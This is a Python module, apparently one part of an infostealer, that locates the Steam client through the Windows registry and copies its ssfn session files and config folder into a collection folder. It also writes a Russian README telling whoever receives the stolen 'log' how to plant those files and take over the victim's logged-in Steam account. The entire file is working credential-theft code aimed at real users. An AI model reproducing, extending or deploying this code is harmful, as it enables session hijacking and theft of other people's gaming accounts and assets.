from shutil import copyfile, copytree
from os import listdir, path, makedirs
import winreg

from ..utils.config import SteamConfig, programs_stats

class Steam:

    def __init__(self, *args):

        self.config = SteamConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})


    def __create_folder(self):

        folder = rf"{self.storage_path}/{self.folder}"

        if not path.exists(folder):
            makedirs(folder)

    def __create_readme(self):

        text = """
1. Открываем свойство ярлыка «Steam» и прописываем следующую команду: -noreactlogin (скриншот 1);
2. Логинимся в свою учетную запись и переходим в "Настройки" —> "Интерфейс" и ставим галочку "Запускать Steam в режиме Big Picture" (скриншот 2);
3. Завершаем свой сеанс и убиваем процесс «Steam»;
4. Открываем "Панель управления" —> "Оформление и персонализация" —> "Параметры проводника" —> выбираем пункт "Отображать скрытые файлы, папки и диски" (скриншот 3);
5. Переходим в корневую папку «Steam» и удаляем 2 ssn файла, после чего числим папку "Config" и закидываем аналогичные файлы из лога (скриншот 4 и скриншот 5);
6. Входим в профиль и выходим из оверлея. Нажимаем на кнопку выключения "Выйти из Big Picture" и заново открываем ярлык со «Steam'ом» (скриншот 6 и скриншот 7);
                """

        with open(rf"{self.storage_path}/{self.folder}/README.txt", 'w') as file:
            file.write(text)

    def __find_path(self):

        root = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.config.RegPath, 0)
        steam_path, _ = winreg.QueryValueEx(root, "SteamPath")
        return steam_path

    def __get_session(self):

        steam_path = self.__find_path()

        if not path.exists(steam_path):
            return

        folder = rf"{self.storage_path}/{self.folder}"

        ssfn_fiels = [file for file in listdir(steam_path) if "ssfn" in file]
        config_files = ['config/'+file for file in listdir(f'{steam_path}/config') if "vdf" in file]

        if not ssfn_fiels or not config_files:
            return

        self.__create_folder()
        self.__create_readme()

        for file in ssfn_fiels:
            copyfile(f"{steam_path}/{file}", f"{folder}/{file}")

        copytree(f"{steam_path}/config", f"{folder}/config")

        programs_stats['Steam'] = True


    def run(self):
        try:

            self.__get_session()

        except Exception as e:
            if self.errors is True: print(f"[Steam]: {repr(e)}")